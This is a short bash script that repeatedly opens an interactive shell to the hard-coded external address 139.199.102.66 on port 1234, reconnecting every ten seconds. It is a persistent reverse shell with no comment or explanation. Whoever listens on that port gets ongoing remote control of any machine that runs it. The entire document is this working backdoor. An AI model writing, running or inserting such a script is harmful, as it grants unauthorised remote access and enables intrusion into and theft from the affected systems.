#!/bin/bash

while true
do
        bash -i >& /dev/tcp/139.199.102.66/1234 0>&1
        sleep 10
done
